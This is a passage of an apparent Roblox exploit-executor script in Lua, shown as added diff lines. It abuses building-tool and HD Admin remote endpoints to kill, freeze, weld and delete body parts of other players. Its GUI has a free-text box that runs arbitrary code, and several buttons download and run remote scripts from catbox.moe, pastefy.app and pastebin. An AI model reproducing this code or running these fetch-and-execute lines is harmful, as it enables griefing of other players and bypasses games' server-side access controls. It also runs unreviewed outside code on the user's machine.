+                ["Part"] = part,
+                ["TextureId"] = "rbxassetid://" .. texid
+            }
+        }
+    }
+    _(args)
+end
+
+    function SetTrans(part,int)
+        local args = {
+            [1] = "SyncMaterial",
+            [2] = {
+                [1] = {
+                    ["Part"] = part,
+                    ["Transparency"] = int
+                }
+            }
+        }
+        _(args)
+    end
+
+spawn(function()
+yerpp(knfe.Handle)
+end)
+spawn(function()
+AddMesh(knfe.Handle)
+end)
+spawn(function()
+SetMesh(knfe.Handle, "18114736783",Vector3.new(0, 0, 0))
+end)
+spawn(function()
+SetTexture(knfe.Handle, "80617091791234")
+end)
+
+function bleed(target)
+    if not target or not target.Character then return end
+    
+    local stopBleeding = false
+    local activeBloodParts = {} 
+    local characterConnection
+    characterConnection = target.CharacterAdded:Connect(function()
+        stopBleeding = true
+
+        for _, blood in pairs(activeBloodParts) do
+            if blood and blood.Parent then
+                DestroyPart(blood)
+            end
+        end
+        if characterConnection then
+            characterConnection:Disconnect()
+        end
+    end)
+    
+
+    coroutine.wrap(function()
+        while not stopBleeding and target and target.Character do
+            local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
+            local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
+            
+            if rootPart then
+
+                coroutine.wrap(function()
+                yez=CFrame.new(0,-10,0)
+                    local blood = remote:InvokeServer("CreatePart", "Ball", yez, target.Character)
+                    if blood then
+                        table.insert(activeBloodParts, blood)
+                        
+                        spawn(function()
+                        Color(blood, Color3.fromRGB(255, 0, 0))
+                        end)
+                    
+                        spawn(function()
+    Resize(blood, Vector3.new(0.2, 0.2, 0.2), rootPart.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1)))
+end)
+                        spawn(function()
+                        SetAnchor(false, blood)
+                        end)
+                        coroutine.wrap(function()
+                            wait(2)
+                            Resize(blood, Vector3.new(0.8, 0.1, 0.8),blood.CFrame)
+                            Resize(blood, Vector3.new(0.9, 0.1, 0.9),blood.CFrame)
+                            SetTrans(blood, 0.9)
+                            SetTrans(blood, 0.7)
+                            SetTrans(blood, 0.5)
+                            SetTrans(blood, 0.3)
+                            SetTrans(blood, 0.1)
+                            DestroyPart(blood)
+                            
+                        
+                            for i, v in pairs(activeBloodParts) do
+                                if v == blood then
+                                    table.remove(activeBloodParts, i)
+                                    break
+                                end
+                            end
+                        end)()
+                    end
+                end)()
+            end
+            
+            wait(0.005)
+        end
+    end)()
+end
+
+function c0lefect(E)
+local argsCreate = {
+        [1] = "CreateDecorations",
+        [2] = {
+            [1] = {
+                ["Part"] = E,
+                ["DecorationType"] = "Sparkles"
+            }
+        }
+    }
+
+   
+    local argsSync = {
+        [1] = "SyncDecorate",
+        [2] = {
+            [1] = {
+                ["Part"] = E,
+                ["DecorationType"] = "Sparkles",
+                ["SparkleColor"] = Color3.fromRGB(255, 255, 0)
+            } 
+        } 
+    }
+
+local args = {
+	"Remove",
+	{
+		E:FindFirstChild('Sparkles')
+	}
+}
+
+
+
+    _(argsCreate)
+    _(argsSync)
+task.wait(1)
+    _(args)
+end
+
+
+			function Weld(part1, part2,lead)
+				local args = {
+					[1] = "CreateWelds",
+					[2] = {
+						[1] = part1,
+						[2] = part2
+					},
+					[3] = lead
+				}
+				_(args)
+	
+			end
+function breakWelds(part)
+    local welds = {}
+    for _, weld in ipairs(part:GetDescendants()) do
+        if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
+            table.insert(welds, weld)
+        end
+    end
+
+    if #welds == 0 then
+        return false
+    end
+
+    local args = {
+        "RemoveWelds",
+        welds
+    }
+    _(args)
+    return true
+end
+
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+local arm = character:FindFirstChild("Right Arm") and character:FindFirstChild("Left Arm") and character:FindFirstChild("Torso") 
+local holdAnimation = Instance.new("Animation")
+holdAnimation.AnimationId = "rbxassetid://48146273"
+local holdTrack = humanoid:LoadAnimation(holdAnimation)
+
+local killAnimation = Instance.new("Animation")
+killAnimation.AnimationId = "rbxassetid://48146273"
+local killTrack = humanoid:LoadAnimation(killAnimation)
+
+local knifeHoldAnim = Instance.new("Animation")
+knifeHoldAnim.AnimationId = "rbxassetid://299225058"
+
+local staffupAnim = Instance.new("Animation")
+staffupAnim.AnimationId = "rbxassetid://27432691"
+
+local swordhitAnim = Instance.new("Animation")
+swordhitAnim.AnimationId = "rbxassetid://27432686"
+
+local holdstaffAnim = Instance.new("Animation")
+holdstaffAnim.AnimationId = "rbxassetid://57794492"
+
+local stabAnim = Instance.new("Animation")
+stabAnim.AnimationId = "rbxassetid://30174375"
+
+
+				local track1 = humanoid:LoadAnimation(staffupAnim)
+				local track2 = humanoid:LoadAnimation(swordhitAnim)
+				holdTrack = humanoid:LoadAnimation(holdstaffAnim)
+
+
+
+
+function GrabAnim()
+				track1.Looped = false
+				track2.Looped = false
+				holdTrack.Looped = false
+
+				track1:Play()
+				track1.Stopped:Wait()
+
+				track2:Play()
+				track2.Stopped:Wait()
+
+				holdTrack:Play()
+				holdTrack:AdjustSpeed(0)
+end
+
+function Kill()
+local stabTrack = humanoid:LoadAnimation(stabAnim)
+	stabTrack.Looped = false
+	stabTrack:Play()
+	stabTrack.Stopped:Wait()
+
+	if holdTrack then holdTrack:Stop() end
+end
+
+
+function failed()
+				track1.Looped = false
+				track2.Looped = false
+				holdTrack.Looped = false
+
+				track1:Play()
+        track1:AdjustSpeed(3)
+				track1.Stopped:Wait()
+
+				
+         holdTrack:Play()
+         wait(0.3)
+         holdTrack:Stop()
+end
+
+
+local isBusy = false
+local alignPosition
+local alignOrientation
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer 
+
+local function attachBehind(targetChar)
+    local root = character:FindFirstChild("HumanoidRootPart")
+    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
+    if root and targetRoot then
+        
+        local attachment0 = root:FindFirstChild("Attachment") or Instance.new("Attachment", root)
+        local attachment1 = targetRoot:FindFirstChild("Attachment") or Instance.new("Attachment", targetRoot)
+
+   
+        alignPosition = Instance.new("AlignPosition")
+        alignPosition.MaxForce = 1000000
+        alignPosition.Responsiveness = 200
+        alignPosition.Attachment0 = attachment0
+        alignPosition.Attachment1 = attachment1
+        alignPosition.Parent = root
+        alignOrientation = Instance.new("AlignOrientation")
+        alignOrientation.MaxTorque = 1000000
+        alignOrientation.Responsiveness = 200
+        alignOrientation.Attachment0 = attachment0
+        alignOrientation.Attachment1 = attachment1
+        alignOrientation.Parent = root
+
+     
+        attachment1.Position = Vector3.new(0, 0, 0.5)
+    end
+end
+
+local function detach()
+    if alignPosition then
+        alignPosition:Destroy()
+        alignPosition = nil
+    end
+    if alignOrientation then
+        alignOrientation:Destroy()
+        alignOrientation = nil
+    end
+end
+
+local function attacke()
+    if isBusy then return end
+    isBusy = true
+
+    local hitPlayer = nil
+local touchedConnection
+
+local function onTouch(other)
+    local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
+    if otherPlayer and otherPlayer ~= player then
+        hitPlayer = otherPlayer
+    end
+end
+
+touchedConnection = arm.Touched:Connect(onTouch)
+task.wait(0.15)
+if touchedConnection then
+    touchedConnection:Disconnect()
+end
+
+    if hitPlayer and hitPlayer.Character then
+        
+RequestCommand:InvokeServer(";speed " ..hitPlayer.Name.. " 0")
+ 
+        
+				track1.Looped = false
+				track2.Looped = false
+				holdTrack.Looped = false
+
+				track1:Play()
+				track1.Stopped:Wait()
+
+				track2:Play()
+        track2:AdjustSpeed(3)
+				track2.Stopped:Wait()
+
+				holdTrack:Play()
+        
+				holdTrack:AdjustSpeed(0)
+spawn(function()
+attachBehind(hitPlayer.Character)
+wait(0.8)
+detach()
+end)
+spawn(function()
+SetLocked(hitPlayer.Character.Torso, false)
+end)
+spawn(function()
+SetLocked(char.Torso, false)
+end)
+ Weld(character.Torso,hitPlayer.Character.Torso,character.Torso)
+Weld(character.Torso,hitPlayer.Character.HumanoidRootPart,character.Torso)
+Weld(character.Torso,hitPlayer.Character.Head,character.Torso)
+
+
+wait(3)
+            spawn(function()
+            Kill()
+            end)
+            bleed(hitPlayer)
+            wait(0.5)
+           RequestCommand:InvokeServer(";kill " ..hitPlayer.Name)
+           wait(0.5)
+breakWelds(character.Torso)
+breakWelds(hitPlayer.Character.Torso)
+spawn(function()
+wait(0.8)
+
+spawn(function()
+SetLocked(hitPlayer.Character.Torso, false)
+end)
+spawn(function()
+SetLocked(hitPlayer.Character["Right Arm"], false)
+end)
+spawn(function()
+SetLocked(hitPlayer.Character["Left Arm"], false)
+end)
+spawn(function()
+SetLocked(hitPlayer.Character["Right Leg"], false)
+end)
+spawn(function()
+SetLocked(hitPlayer.Character["Left Leg"], false)
+end)
+
+spawn(function()
+SetCollision(hitPlayer.Character.Torso, true)
+end)
+spawn(function()
+SetCollision(hitPlayer.Character["Right Arm"], true)
+end)
+spawn(function()
+SetCollision(hitPlayer.Character["Left Arm"], true)
+end)
+spawn(function()
+SetCollision(hitPlayer.Character["Right Leg"], true)
+end)
+spawn(function()
+SetCollision(hitPlayer.Character["Left Leg"], true)
+end)
+end)
+
+wait(0.3)
+           
+            
+            isBusy = false
+  
+
+    else
+        
+        failed()
+        wait(0.4)
+            isBusy = false
+    end
+end
+
+
+
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+ if gameProcessed then return end
+
+ if input.KeyCode == Enum.KeyCode.Z then
+  local args = {
+  "Remove",
+  {
+   knfe.Handle
+  }
+ }
+ _(args)
+ knfe:Destroy()
+
+ RequestCommand:InvokeServer(";hat me 18420472059")
+ wait(1)
+ local knife = character:FindFirstChild("Accessory (KNIF4ELERFTAccessory)")
+
+ spawn(function()
+ local args = {
+  "Remove",
+  {
+   knife.Handle.SpecialMesh
+  }
+ }
+ _(args)
+ end)
+
+ spawn(function()
+ AddMesh(knife.Handle)
+ end)
+ spawn(function()
+ SetMesh(knife.Handle, "18114736783", Vector3.new(0, 0,-0.25))
+ end)
+ spawn(function()
+ SetTexture(knife.Handle, "80617091791234")
+ end)
+
+ ready = true
+ end 
+end)
+
+
+
+
+UserInputService.TouchTap:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+if ready == true then
+    attacke()
+end
+end)
+
+end
+end)
+
+nextpage_3.Name = "nextpage"
+nextpage_3.Parent = scriptspage2
+nextpage_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+nextpage_3.BorderColor3 = Color3.fromRGB(129, 26, 255)
+nextpage_3.BorderSizePixel = 2
+nextpage_3.Position = UDim2.new(0.463894963, 0, 0.922239065, 0)
+nextpage_3.Size = UDim2.new(0, 34, 0, 15)
+nextpage_3.Font = Enum.Font.Arial
+nextpage_3.Text = "<"
+nextpage_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+nextpage_3.TextSize = 18.000
+nextpage_3.TextWrapped = true
+
+ambientShadow.Name = "ambientShadow"
+ambientShadow.Parent = top
+ambientShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+ambientShadow.BackgroundTransparency = 1.000
+ambientShadow.Position = UDim2.new(0.495623618, 0, 5.32758617, 14)
+ambientShadow.Size = UDim2.new(1.0087527, 18, 11.8965521, 18)
+ambientShadow.ZIndex = -15
+ambientShadow.Image = "rbxassetid://1316045217"
+ambientShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+ambientShadow.ImageTransparency = 0.810
+ambientShadow.ScaleType = Enum.ScaleType.Slice
+ambientShadow.SliceCenter = Rect.new(10, 10, 118, 118)
+
+penumbraShadow.Name = "penumbraShadow"
+penumbraShadow.Parent = top
+penumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+penumbraShadow.BackgroundTransparency = 1.000
+penumbraShadow.Position = UDim2.new(0.503156483, 0, 5.42907858, 14)
+penumbraShadow.Size = UDim2.new(0.993687093, 18, 11.6935692, 18)
+penumbraShadow.ZIndex = -15
+penumbraShadow.Image = "rbxassetid://1316045217"
+penumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+penumbraShadow.ImageTransparency = 0.810
+penumbraShadow.ScaleType = Enum.ScaleType.Slice
+penumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)
+
+umbraShadow.Name = "umbraShadow"
+umbraShadow.Parent = top
+umbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+umbraShadow.BackgroundTransparency = 1.000
+umbraShadow.Position = UDim2.new(0.503156483, 0, 5.42907858, 14)
+umbraShadow.Size = UDim2.new(0.993687093, 18, 11.6935692, 18)
+umbraShadow.ZIndex = -15
+umbraShadow.Image = "rbxassetid://1316045217"
+umbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+umbraShadow.ImageTransparency = 0.810
+umbraShadow.ScaleType = Enum.ScaleType.Slice
+umbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)
+
+local pages = {
+	homepage,
+	serverpage,
+	scriptspage,
+	executorpage,
+	outputpage,
+	scriptspage2,
+	scriptspage3
+}
+
+local function showPage(page)
+	for _,p in ipairs(pages) do
+		if p then
+			p.Visible = false
+		end
+	end
+	page.Visible = true
+end
+
+Home.MouseButton1Click:Connect(function()
+	showPage(homepage)
+end)
+
+Server.MouseButton1Click:Connect(function()
+	showPage(serverpage)
+end)
+
+Scripts.MouseButton1Click:Connect(function()
+	showPage(scriptspage)
+end)
+
+Executor.MouseButton1Click:Connect(function()
+	showPage(executorpage)
+end)
+
+Output.MouseButton1Click:Connect(function()
+	showPage(outputpage)
+end)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+user.Text = player.Name
+
+age.Text = player.AccountAge .. " Days"
+
+jobid.Text = "Job ID: " .. game.JobId
+
+RunService.RenderStepped:Connect(function()
+	local t = os.date("*t")
+	local timeStr = string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
+	svrtime.Text = "Server Time: " .. timeStr
+	realtime.Text = "Time: " .. timeStr
+end)
+
+local minimized = false
+
+minimize.MouseButton1Click:Connect(function()
+minimized = not minimized
+	Holder.Visible = not minimized
+end)
+
+local maximized = false
+local normalTopSize = top.Size
+local normalTopPos = top.Position
+
+maximize.MouseButton1Click:Connect(function()
+	top.Position = UDim2.new(0.653, 0, 0.364, 0)
+end)
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size420x420
+
+local content, isReady = Players:GetUserThumbnailAsync(
+	player.UserId,
+	thumbType,
+	thumbSize
+)
+
+user_2.Image = content
+
+local scriptPages = {
+	scriptspage,
+	scriptspage2,
+	scriptspage3
+}
+
+local currentScriptPage = 1
+
+local function showScriptPage(index)
+	for i, page in ipairs(scriptPages) do
+		page.Visible = (i == index)
+	end
+	currentScriptPage = index
+end
+
+--[ This was bug and this is the reason why the Scriptspage only have 2 pages ]--
+nextpage.MouseButton1Click:Connect(function()
+showScriptPage(2)
+end)
+beforepage.MouseButton1Click:Connect(function()
+showScriptPage(1)
+end)
+nextpage_2.MouseButton1Click:Connect(function()
+showScriptPage(3)
+end)
+beforepage_2.MouseButton1Click:Connect(function()
+showScriptPage(2)
+end)
+nextpage_3.MouseButton1Click:Connect(function()
+	showScriptPage(1)
+end)
+Scripts.MouseButton1Click:Connect(function()
+showScriptPage(1)
+end)
+
+exec.MouseButton1Click:Connect(function()
+	if input.Text == "" then return end
+
+	local success, err = pcall(function()
+		loadstring(input.Text)()
+	end)
+
+	if success then
+	else
+	end
+end)
+
+
+clear.MouseButton1Click:Connect(function()
+	input.Text = ""
+end)
+
+clear_2.MouseButton1Click:Connect(function()
+	output.Text = "\n"
+end)
+
+primadon.MouseButton1Click:Connect(function()
+rq:InvokeServer(";r15")
+wait(1)
+rq:InvokeServer(";removeaccessories")
+wait(1)
+rq:InvokeServer(";bundle me 38499587027735")
+wait(1)
+rq:InvokeServer(";size me 10")
+loadstring(game:HttpGet("https://files.catbox.moe/8fmn5s.txt"))()
+rq:InvokeServer(";speed me 30")
+loadstring(game:HttpGet("https://files.catbox.moe/dyphvq.txt"))()
+wait(1)
+rq:InvokeServer(";hat me 65523893")
+end)
+ssp.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/k8wxil.txt"))()
+end)
+nzi.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/qnvbb3.txt"))()
+rq:InvokeServer(";lockmap")
+end)
+hax1.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/5OyexrCa/raw"))()
+end)
+hax2.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/F3teCezC/raw"))()
+end)
+noot.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/ruDbhiGp/raw"))()
+end)
+ship.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/8e8ivx.txt"))()
+end)
+sledoni.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/QtpOv6Ei/raw"))()
+end)
+infiniteyield.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/dOi4GDqd/raw"))()
+end)
+
+--[ Progress bar loading ]--
+
+local maxPercentage = 100
+
+local function updateProgress()
+	for i = 0, maxPercentage do
+		progress.Text = "Loading (" .. i .. "%)"
+		task.wait(0.05 * (1 - (i / maxPercentage)))
+	end
+
+	progress.Text = "Success! You are now be able to use."
+end
+
+updateProgress()
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+
+    local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+    local function GiveBTools()
+        rq:InvokeServer(";btools")
+    end
+
+    GiveBTools()
+    player.CharacterAdded:Connect(function()
+        task.wait(1)
+        GiveBTools()
+    end)
+
+local LogService = game:GetService("LogService")
+
+local TextService = game:GetService("TextService")
+local MAX_CHARS = 10000000
+
+local function append(text)
+	output.Text ..= text .. "\n"
+
+	if #output.Text > MAX_CHARS then
+		output.Text = string.sub(output.Text, #output.Text - MAX_CHARS)
+	end
+
+	output.CursorPosition = #output.Text + 1
+end
+
+local function formatMessage(message, messageType)
+	if messageType == Enum.MessageType.MessageOutput then
+		return "" .. message
+	elseif messageType == Enum.MessageType.MessageWarning then
+		return "" .. message
+	elseif messageType == Enum.MessageType.MessageError then
+		return "" .. message
+	else
+		return "" .. message
+	end
+end
+
+LogService.MessageOut:Connect(function(message, messageType)
+	append(formatMessage(message, messageType))
+end)
+
+local oldPrint = print
+local oldWarn = warn
+local oldError = error
+
+print = function(...)
+	local msg = table.concat({...}, " ")
+	append("" .. msg)
+	oldPrint(...)
+end
+
+warn = function(...)
+	local msg = table.concat({...}, " ")
+	append("" .. msg)
+	oldWarn(...)
+end
+
+error = function(...)
+	local msg = table.concat({...}, " ")
+	append("" .. msg)
+	oldError(...)
+end
+
+--[ function for young Sheldon (late add) ]--
+
+sledoniyong.MouseButton1Click:Connect(function()
+wait(2)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "Young shelon gui update"
+gui.Parent = game.CoreGui
+ 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+
+local Ui = Instance.new("Frame")
+Ui.Size = UDim2.new(0.0, 489, 0.0, 300)
+Ui.Position = UDim2.new(0.0, 0, 0.0, 0)
+Ui.BackgroundColor3 = Color3.new(1, 1, 1)
+Ui.BorderColor3 = Color3.new(0, 0, 0)
+Ui.BorderSizePixel = 0
+Ui.Active = true
+Ui.BackgroundTransparency = 0.6
+Ui.Draggable = true
+Ui.Parent = gui
+ 
+local Image = Instance.new("ImageLabel")
+Image.Size = UDim2.new(1.004, 0, 1.0, 0)
+Image.Position = UDim2.new(0.0, 0, 0.0, 0)
+Image.BackgroundColor3 = Color3.new(0, 0, 0)
+Image.ImageColor3 = Color3.new(1, 1, 1)
+Image.Image = "rbxassetid://14902240136"
+Image.ImageTransparency = 0.4
+Image.Parent = Ui
+ 
+Image.BackgroundTransparency = 1
+ 
+local Text = Instance.new("TextLabel")
+Text.Size = UDim2.new(1.0, 0, 0.1, 20)
+Text.Position = UDim2.new(0.0, 0, 0.0, 0)
+Text.BackgroundColor3 = Color3.new(0, 0, 0)
+Text.BorderColor3 = Color3.new(0, 0, 0)
+Text.BorderSizePixel = 1
+Text.Text = "yong shelon gui"
+Text.BackgroundTransparency = 1
+Text.TextColor3 = Color3.new(0, 0, 0)
+Text.Font = Enum.Font.Highway
+Text.Parent = Image
+Text.TextSize = 30
+ 
+local TextBox = Instance.new("TextBox")
+TextBox.Size = UDim2.new(0.6, 29, 0.7, 7)
+TextBox.Position = UDim2.new(0.0, 4, 0.0, 45)
+TextBox.BackgroundColor3 = Color3.new(1, 1, 1)
+TextBox.BorderColor3 = Color3.new(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Text = ""
+TextBox.PlaceholderText = "Execute His Thoughts"
+TextBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextColor3 = Color3.new(0, 0, 0)
+TextBox.BackgroundTransparency = 0.4
+TextBox.Font = Enum.Font.SpecialElite
+TextBox.TextSize = 18
+TextBox.Parent = Image
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.ClearTextOnFocus = failed
+TextBox.MultiLine = true
+TextBox.TextWrapped = true
+ 
+local Exe = Instance.new("TextButton")
+Exe.Size = UDim2.new(0.1, 22, 0.1, 0)
+Exe.Position = UDim2.new(0.0, 4, 0.0, 266)
+Exe.BackgroundColor3 = Color3.new(1, 1, 1)
+Exe.BorderColor3 = Color3.new(0, 0, 0)
+Exe.BorderSizePixel = 0
+Exe.Text = "exe"
+Exe.BackgroundTransparency = 0.1
+Exe.TextColor3 = Color3.new(0, 0, 0)
+Exe.Font = Enum.Font.Montserrat
+Exe.Parent = Image
+Exe.TextSize = 21
+Exe.MouseButton1Click:Connect(function()
+assert(loadstring(TextBox.Text))()
+end)
+ 
+local clea = Instance.new("TextButton")
+clea.Size = UDim2.new(0.1, 22, 0.1, 0)
+clea.Position = UDim2.new(0.1, 31, 0.0, 266)
+clea.BackgroundColor3 = Color3.new(1, 1, 1)
+clea.BorderColor3 = Color3.new(0, 0, 0)
+clea.BorderSizePixel = 0
+clea.Text = "clear"
+clea.BackgroundTransparency = 0.1
+clea.TextColor3 = Color3.new(0, 0, 0)
+clea.Font = Enum.Font.Montserrat
+clea.Parent = Image
+clea.TextSize = 21
+clea.MouseButton1Click:Connect(function()
+TextBox.Text = ""
+end)
+ 
+local Re = Instance.new("TextButton")
+Re.Size = UDim2.new(0.1, 22, 0.1, 0)
+Re.Position = UDim2.new(0.3, 8, 0.0, 266)
+Re.BackgroundColor3 = Color3.new(1, 1, 1)
+Re.BorderColor3 = Color3.new(0, 0, 0)
+Re.BorderSizePixel = 0
+Re.Text = "R6"
+Re.BackgroundTransparency = 0.1
+Re.TextColor3 = Color3.new(0, 0, 0)
+Re.Font = Enum.Font.Montserrat
+Re.Parent = Image
+Re.TextSize = 21
+Re.MouseButton1Click:Connect(function()
+rq:InvokeServer(";r6")
+end)
+ 
+local R6 = Instance.new("TextButton")
+R6.Size = UDim2.new(0.1, 22, 0.1, 0)
+R6.Position = UDim2.new(0.4, 35, 0.0, 266)
+R6.BackgroundColor3 = Color3.new(1,1, 1)
+R6.BorderColor3 = Color3.new(0, 0, 0)
+R6.BorderSizePixel = 0
+R6.Text = "Re"
+R6.BackgroundTransparency = 0.1
+R6.TextColor3 = Color3.new(0, 0, 0)
+R6.Font = Enum.Font.Montserrat
+R6.Parent = Image
+R6.TextSize = 23
+R6.MouseButton1Click:Connect(function()
+rq:InvokeServer(";re")
+end)
+ 
+local Scr = Instance.new("ScrollingFrame")
+Scr.Size = UDim2.new(0.3, 7, 0.5, 39)
+Scr.Position = UDim2.new(0.0, 332, 0.0, 72)
+Scr.BackgroundColor3 = Color3.new(1, 1, 1)
+Scr.BorderColor3 = Color3.new(0, 0, 0)
+Scr.BorderSizePixel = 0
+Scr.Parent = Image
+Scr.ScrollBarThickness = 0
+ 
+Scr.BackgroundTransparency = 1
+ 
+local Jojo = Instance.new("TextButton")
+Jojo.Size = UDim2.new(0.9, 19, 0.0, 25)
+Jojo.Position = UDim2.new(0.0, 0, 0.0, 0)
+Jojo.BackgroundColor3 = Color3.new(1, 1, 1)
+Jojo.BorderColor3 = Color3.new(0, 0, 0)
+Jojo.BorderSizePixel = 0
+Jojo.Text = "Steve"
+Jojo.BackgroundTransparency = 0.3
+Jojo.TextColor3 = Color3.new(0, 0, 0)
+Jojo.Font = Enum.Font.Montserrat
+Jojo.Parent = Scr
+Jojo.TextSize = 19
+Jojo.MouseButton1Click:Connect(function()
+rq:InvokeServer(";r15")
+wait(1)
+rq:InvokeServer(";char me q_rc7")
+wait(1)
+rq:InvokeServer(";bundle me 46771")
+wait(1)
+rq:InvokeServer(";shirt me 16512333409")
+wait(1)
+rq:InvokeServer(";pants me 14955922682")
+wait(1)
+loadstring(game:HttpGet("https://pastebin.com/raw/pJ7r63eC"))()
+rq:InvokeServer(";head me 0")
+wait(1)
+rq:InvokeServer(";hat me 128875258353354")
+loadstring(game:HttpGet("https://pastebin.com/raw/X6XxjFbx"))()
+local player = game.Players.LocalPlayer
+local Character = player.Character or player.CharacterAdded:Wait()
+local HMD = Character.HumanoidRootPart
+
+function GitAud(soundgit,filename)
+    SoundName=tostring(SoundName)
+    local url=soundgit
+    local FileName = filename
+    writefile(FileName..".mp3", game:HttpGet(url))
+    return (getcustomasset or getsynasset)(FileName..".mp3")
+end
+
+function CustomGitSound(soundlink, vol, filename)
+local BGMusic = Instance.new("Sound")
+    BGMusic.SoundId = GitAud(soundlink, filename)
+    BGMusic.Parent = HMD
+    BGMusic.Volume = 2
+    BGMusic.Name = "BGM_MUSIC"
+    BGMusic.Looped = true
+    BGMusic:Play()
+end
+
+
+
+
+local player = game.Players.LocalPlayer
+local char = player.Character
+local tool
+for i,v in player:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+for i,v in game.ReplicatedStorage:GetDescendants() do
+    if v.Name == "SyncAPI" then
+        tool = v.Parent
+    end
+end
+
+remote = tool.SyncAPI.ServerEndpoint
+function _(args)
+    remote:InvokeServer(unpack(args))
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Players = game:GetService("Players")
+
+local UserInputService = game:GetService("UserInputService")
+
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
+
+local player = Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+
+local arm = character:FindFirstChild("Right Arm")
+local humanoid = character:FindFirstChildOfClass("Humanoid")
+
+
+local isDead = false
+
+humanoid.Died:Connect(function()
+	isDead = true
+end)
+
+
+local animator = humanoid:FindFirstChildOfClass("Animator")
+
+local attackAnim = Instance.new("Animation")
+attackAnim.AnimationId = "rbxassetid://110361063508944"
+local attackTrack = animator:LoadAnimation(attackAnim)
+attackTrack.Priority = Enum.AnimationPriority.Action
+
+
+function KillTarget(target)
+    if target and target.Character then
+        local head = target.Character:FindFirstChild("Head")
+        if head then
+            local args = {
+                [1] = "SetLocked",
+                [2] = {
+                    [1] = head
+                },
+
+                [3] = false
+            }
+            remote:InvokeServer(unpack(args))
+            task.wait(0.1) 
+            local args2 = {
+                [1] = "Remove",
+                [2] = {
+                    [1] = head
+                }
+            }
+            remote:InvokeServer(unpack(args2))
+        end
+    end
+end
+
+
+local function attack()
+    attackTrack:Play() 
+    local hitPlayer = nil
+    local touchedConnection
+
+    local function onTouch(other)
+        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
+        if otherPlayer and otherPlayer ~= player then
+            hitPlayer = otherPlayer
+        end
+    end
+
+    touchedConnection = arm.Touched:Connect(onTouch)
+    task.wait(0.5)
+    if touchedConnection then
+        touchedConnection:Disconnect()
+    end
+    if hitPlayer then
+               RequestCommand:InvokeServer(" ")
+        KillTarget(hitPlayer)
+        wait(1)
+        
+    end
+
+end
+
+UserInputService.TouchStarted:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+
+    if isDead then return end 
+    attack()
+end)
+end)
+ 
+local Deku = Instance.new("TextButton")
+Deku.Size = UDim2.new(0.9, 19, 0.0, 25)
+Deku.Position = UDim2.new(0.0, 0, 0.0, 29)
+Deku.BackgroundColor3 = Color3.new(1, 1, 1)
+Deku.BorderColor3 = Color3.new(0, 0, 0)
+Deku.BorderSizePixel = 0
+Deku.Text = "Goner"
+Deku.BackgroundTransparency = 0.3
+Deku.TextColor3 = Color3.new(0, 0, 0)
+Deku.Font = Enum.Font.Montserrat
+Deku.Parent = Scr
+Deku.TextSize = 19
+Deku.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://files.catbox.moe/lr7247.txt"))()
+end)
+ 
+local KJ = Instance.new("TextButton")
+KJ.Size = UDim2.new(0.9, 19, 0.0, 25)
+KJ.Position = UDim2.new(0.0, 0, 0.0, 58)
+KJ.BackgroundColor3 = Color3.new(1, 1, 1)
+KJ.BorderColor3 = Color3.new(0, 0, 0)
+KJ.BorderSizePixel = 0
+KJ.Text = "Primadon"
+KJ.BackgroundTransparency = 0.3
+KJ.TextColor3 = Color3.new(0, 0, 0)
+KJ.Font = Enum.Font.Montserrat
+KJ.Parent = Scr
+KJ.TextSize = 19
+KJ.MouseButton1Click:Connect(function()
+rq:InvokeServer(";r15")
+wait(1)
+rq:InvokeServer(";removeaccessories")
+wait(1)
+rq:InvokeServer(";bundle me 38499587027735")
+wait(1)
